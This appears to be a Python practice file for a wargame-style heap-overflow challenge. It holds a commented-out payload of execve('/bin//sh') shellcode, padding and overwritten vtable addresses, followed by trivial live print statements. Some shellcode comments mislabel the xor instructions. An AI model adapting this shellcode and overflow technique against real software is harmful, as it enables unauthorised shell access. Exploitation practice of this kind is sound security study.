# # Contains the address of the shellcode (a->_annotation + 4)
# VTABLE_0 = b"\x10\xa0\x04\x08"

# # Shellcode without '\n' or '\0' that executes 'execve("/bin//sh", NULL, NULL)'
# SHELLCODE = (
#     b"\x31\xc0"  # xor eax, eax
#     + b"\x50"  # push eax (null terminator)
#     + b"\x04\x0b"  # add al, 11 (execve)
#     + b"\x68//sh"  # push "//sh"
#     + b"\x68/bin"  # push "/bin"
#     + b"\x89\xe3"  # mov ebx, esp (ebx points to "/bin//sh")
#     + b"\x31\xc9"  # moc ecx, ecx (argv = NULL)
#     + b"\x31\xd2"  # moc edx, edx (envp = NULL)
#     + b"\xcd\x80"  # int 0x80 (syscall)
# )

# ANNOTATION_SIZE = 100
# VALUE_SIZE = 4
# MALLOC_HEADER_SIZE = 4  # only 4 instead of 8 since previous chunk is in use
# PADDING_SIZE = (
#     ANNOTATION_SIZE + VALUE_SIZE + MALLOC_HEADER_SIZE - len(VTABLE_0) - len(SHELLCODE)
# )
# PADDING = b"A" * PADDING_SIZE

# # Contains the address of a->_annotation
# VTABLE = b"\x0c\xa0\x04\x08"

# print(VTABLE_0 + SHELLCODE + PADDING + VTABLE)

import time


print("lol")
time.sleep(1)
print("mdr")
